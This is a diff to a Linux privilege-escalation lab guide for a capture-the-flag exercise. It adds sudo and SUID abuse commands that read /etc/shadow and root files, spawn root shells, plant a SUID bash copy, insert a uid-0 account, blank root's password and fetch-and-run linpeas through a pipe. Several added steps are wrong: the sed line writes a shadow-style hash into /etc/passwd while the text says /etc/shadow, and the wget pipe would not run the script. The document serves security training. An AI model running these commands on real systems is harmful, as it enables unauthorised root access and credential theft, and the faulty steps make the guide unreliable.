@@ -46,7 +46,7 @@ Target Linux system must be accessible with user-level credentials.
 
 #### Steps
 1. **Setup**
-   - Verify access to the target system.
+   - Connect via ssh using credentials `user:123456` and verify access to the target system.
    ```bash
    whoami
    ```
@@ -54,24 +54,25 @@ Target Linux system must be accessible with user-level credentials.
    - Enumerate system information and permissions.
    ```bash
    id && uname -a
+   sudo -l
    ```
 3. **Exploitation**
-   - Exploit a misconfigured service (e.g., writable config file).
+   - You notice that one of the binaries that you can execute as `user` with sudo rights without password is `date`. Exploit it to get the flag (hash of root password).
    ```bash
-   echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+   sudo date -l /etc/shadow
    ```
 
 #### Why It Works
-Misconfigured permissions allow low-privileged users to modify critical system files, granting elevated access.
+Misconfigured permissions allow low-privileged users to access critical system files without root privilege access, granting elevated access.
 
 #### Alternatives
-- Use automated scripts like LinPEAS for enumeration.
+- Use automated scripts like LinPEAS for enumeration or exploit other binaries.
 
 #### Resources
 - [Linux Privilege Escalation Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux](https://www.hacktricks.xyz/pentesting/pentesting-linux)
 
 #### Notes
-- Check for writable system files during enumeration.
+- Don't mind the php website deployed on port 80, connect directly via ssh.
 
 ---
 
@@ -97,9 +98,9 @@ Target Linux system must have a sudo rule allowing command execution.
    sudo -l | grep NOPASSWD
    ```
 3. **Exploitation**
-   - Run a permitted command to gain a root shell.
+   - Run a permitted command to gain a root shell. In our case, it was `find`.
    ```bash
-   sudo /bin/bash
+   sudo find . -exec /bin/sh \; -quit
    ```
 
 #### Why It Works
@@ -124,7 +125,7 @@ Escalate privileges by abusing a sudo rule allowing a specific script execution.
 - Sudo Script Misconfiguration: Writable scripts executed via sudo allow code injection.
 
 #### Requirements
-Target Linux system must have a sudo rule for a writable script.
+Target Linux system must have a sudo rule with no password required for an exploitable binary.
 
 #### Steps
 1. **Setup**
@@ -133,19 +134,16 @@ Target Linux system must have a sudo rule for a writable script.
    sudo -l
    ```
 2. **Reconnaissance**
-   - Locate the script allowed by sudo.
-   ```bash
-   sudo -l | grep script
-   ```
+   - Identify the vulnerable binary, `base64`.
+   
 3. **Exploitation**
-   - Modify the script to execute a root shell.
+   - Exploit it to read the flag fromt he root directory
    ```bash
-   echo 'bash -i' > /path/to/script.sh
-   sudo /path/to/script.sh
+   sudo base64 /root/flag | base64 --decode
    ```
 
 #### Why It Works
-Writable scripts executed via sudo allow attackers to inject malicious commands, granting root access.
+- Misconfigurations allows attackers to access sensitive files granting root access.
 
 #### Alternatives
 - Use sudo to run a different privileged command.
@@ -154,19 +152,19 @@ Writable scripts executed via sudo allow attackers to inject malicious commands,
 - [Sudo Abuse Guide: https://gtfobins.github.io/gtfobins/sudo/](https://gtfobins.github.io/gtfobins/sudo/)
 
 #### Notes
-- Ensure the script is writable before modification.
+- TODO.
 
 ---
 
 ### Lab 4: Sudo Example 3
 #### Objective
-Escalate privileges by exploiting sudo access to a command with shell escape.
+Escalate privileges by exploiting sudo access to a command with a writable script.
 
 #### Vulnerabilities
-- Shell Escape: Commands like vi or less allow shell escapes when run with sudo.
+- Poor script access control allows for editing of scripts and executing them as sudo without any password required
 
 #### Requirements
-Target Linux system must allow sudo execution of a command with shell escape.
+Target Linux system must allow sudo execution of a writable script.
 
 #### Steps
 1. **Setup**
@@ -175,28 +173,35 @@ Target Linux system must allow sudo execution of a command with shell escape.
    sudo -l
    ```
 2. **Reconnaissance**
-   - Identify commands with shell escape (e.g., vi).
+   - Identify the writable script. In our case it will be backup.sh.
    ```bash
-   sudo -l | grep vi
+   sudo -l | grep *.sh
    ```
 3. **Exploitation**
-   - Run vi with sudo and escape to a shell.
+   - Edit the script to execute root shell.
    ```bash
-   sudo vi
-   :!bash
+   cat > /path/to/script/backup.sh
    ```
+   - Paste this while cat is running and the press Crtl+C
+   ```bash
+   #!/usr/bin/python3
+   import os
+   os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
+   ```
+   - After that, run `/tmp/bash -p` to get the root shell and find the flag in the /root directory.
 
 #### Why It Works
-Commands like vi allow shell escapes when run with sudo, granting root privileges.
+The scripts clones the root shell and makes it accessible to a low privilege user.
 
 #### Alternatives
-- Use other shell-escaping tools like less or more.
+- Use other shell-escaping tools like less, vim or more.
 
 #### Resources
 - [GTFOBins: https://gtfobins.github.io/](https://gtfobins.github.io/)
+- Find  such scripts in the resources section of the repository
 
 #### Notes
-- Familiarize yourself with shell escape commands in GTFOBins.
+- Ensure that python3 is available. If not, convert the script into a bash shell.
 
 ---
 
@@ -217,18 +222,18 @@ Target Linux system must have permissive sudo rules.
    sudo -l
    ```
 2. **Reconnaissance**
-   - Check for ALL or wildcard sudo permissions.
+   - You will notice that the user is allowed to execute commands to a certain file as sudo without password. Notice the wildcard at the end.
    ```bash
-   sudo -l | grep ALL
+   (ALL) NOPASSWD: /usr/bin/cat /home/user/notes/*
    ```
 3. **Exploitation**
-   - Gain a root shell using sudo.
+   - Get flag via path traversal.
    ```bash
-   sudo /bin/bash
+   sudo cat /home/user/notes/../../../root/flag
    ```
 
 #### Why It Works
-Permissive sudo rules allow low-privileged users to execute arbitrary commands as root.
+Permissive sudo rules allow low-privileged users to execute arbitrary commands or read restricted files as root.
 
 #### Alternatives
 - Edit /etc/passwd using sudo for persistent access.
@@ -262,18 +267,23 @@ Target Linux system must have a vulnerable SUID binary.
    ```bash
    find / -perm -4000 2>/dev/null
    ```
-3. **Exploitation**
-   - Exploit a known vulnerable SUID binary (e.g., find).
+3. **Exploitation**"
+   - Exploit a known vulnerable SUID binary (e.g., sed). Create hash for newroot password's "password".
    ```bash
-   find . -exec /bin/bash -p \;
+   openssl passwd -6 -salt xyz password
    ```
-
+   Output example: $6$xyz$HASH...
+   - Add newroot user to /etc/shadow with sed
+   ```bash
+   sed -i '1i newroot:$6$xyz$HASH...:0:0:root:/root:/bin/bash' /etc/passwd
+   ```
+   - Switch to newroot `su newroot` and get the flag in /root/flag
 #### Why It Works
 SUID binaries run with root privileges, and vulnerabilities allow execution of arbitrary commands.
 
 #### Alternatives
 - Exploit other SUID binaries listed in GTFOBins.
-
+- If /etc/shadow is writable, you can remove the newroot password `sed -i 's/^root:.*/root::0:0:99999:7:::/' /etc/shadow` then connect as root `su root`.
 #### Resources
 - [GTFOBins SUID: https://gtfobins.github.io/+suid/](https://gtfobins.github.io/+suid/)
 
@@ -290,7 +300,7 @@ Gain root access by exploiting a misconfigured SUID binary.
 - SUID Misconfiguration: Custom SUID binaries with insecure code allow privilege escalation.
 
 #### Requirements
-Target Linux system must have a custom SUID binary.
+Target Linux system must have an SUID binary.
 
 #### Steps
 1. **Setup**
@@ -304,9 +314,9 @@ Target Linux system must have a custom SUID binary.
    find / -perm -u=s -type f 2>/dev/null
    ```
 3. **Exploitation**
-   - Execute the SUID binary to gain a root shell.
+   - Execute the SUID binary (date) to read the flag.
    ```bash
-   /path/to/suid_binary
+   date -f /root/flag
    ```
 
 #### Why It Works
@@ -340,18 +350,20 @@ Target Linux system must be accessible with user-level credentials.
    whoami
    ```
 2. **Reconnaissance**
-   - Enumerate system information, users, and permissions.
+   - Enumerate system information, users, and permissions using linpeas.
    ```bash
-   id && cat /etc/passwd && sudo -l
+   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+   chmod +x linpeas.sh
+   ./linpeas.sh
    ```
 3. **Exploitation**
-   - Use findings to exploit a misconfiguration (e.g., writable /etc/passwd).
+   - To get the flag, run linpeas and grep "cybered{".
    ```bash
-   echo 'hacker:0:0:root:/root:/bin/bash' >> /etc/passwd
+   ./linpeas.sh | grep "cybered{"
    ```
 
 #### Why It Works
-Manual enumeration uncovers misconfigurations like writable files or weak permissions, enabling escalation.
+Enumeration with linpeas uncovers misconfigurations like writable files or weak permissions, enabling escalation.
 
 #### Alternatives
 - Use automated tools like LinEnum for faster enumeration.
@@ -369,10 +381,10 @@ Manual enumeration uncovers misconfigurations like writable files or weak permis
 Escalate privileges by exploiting writable system files.
 
 #### Vulnerabilities
-- Insecure Permissions: Writable critical files allow modification by low-privileged users.
+- Insecure Permissions: Critical files readable by low-privileged users.
 
 #### Requirements
-Target Linux system must have writable system files (e.g., /etc/passwd).
+Target Linux system must have such files (e.g., vpn configs).
 
 #### Steps
 1. **Setup**
@@ -381,18 +393,21 @@ Target Linux system must have writable system files (e.g., /etc/passwd).
    whoami
    ```
 2. **Reconnaissance**
-   - Identify writable system files.
+   - Enumerate system information, users, and permissions using linpeas.
    ```bash
-   find /etc -writable 2>/dev/null
+   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+   chmod +x linpeas.sh
+   ./linpeas.sh
    ```
 3. **Exploitation**
-   - Add a root user to /etc/passwd.
+   - You will notice the openvpn file `/etc/openvpn/pass.txt`. It contains root user credentials.
    ```bash
-   echo 'hacker:0:0:root:/root:/bin/bash' >> /etc/passwd
+   cat /etc/openvpn/pass.txt
    ```
+   - Switch to root user and get the flag `su root`  in /root/flag.
 
 #### Why It Works
-Writable system files like /etc/passwd allow attackers to create privileged accounts.
+Because system administrator is not smart enough :).
 
 #### Alternatives
 - Modify /etc/shadow for password-based escalation.
@@ -401,7 +416,7 @@ Writable system files like /etc/passwd allow attackers to create privileged acco
 - [Insecure Permissions Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#file-permissions](https://www.hacktricks.xyz/pentesting/pentesting-linux#file-permissions)
 
 #### Notes
-- Verify file permissions with ls -l before modification.
+- Verify file permissions with ls -l.
 
 ---
 
@@ -422,27 +437,29 @@ Target Linux system must be accessible with user credentials.
    whoami
    ```
 2. **Reconnaissance**
-   - Enumerate cron jobs and SUID binaries.
+   - Enumerate cron jobs and SUID binary.
    ```bash
-   crontab -l && find / -perm -4000 2>/dev/null
+   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+   chmod +x linpeas.sh
+   ./linpeas.sh
    ```
 3. **Exploitation**
-   - Exploit a writable cron script for root access.
+   - Get the flag by grepping while enumerating "cybered{".
    ```bash
-   echo 'bash -i' > /path/to/cron_script.sh
+   ./linpeas.sh | grep "cybered{"
    ```
 
 #### Why It Works
-Enumeration reveals exploitable configurations like writable cron scripts, enabling privilege escalation.
+Enumeration reveals the flag in a process.
 
 #### Alternatives
-- Use LinPEAS for automated enumeration.
+- Use LinEnum for automated enumeration.
 
 #### Resources
 - [Linux Enumeration Guide: https://www.hacktricks.xyz/pentesting/pentesting-linux#manual-enumeration](https://www.hacktricks.xyz/pentesting/pentesting-linux#manual-enumeration)
 
 #### Notes
-- Check cron jobs and SUID binaries thoroughly.
+- Check cron jobs and SUID binaries thoroughly in real-life cases.
 
 ---
 
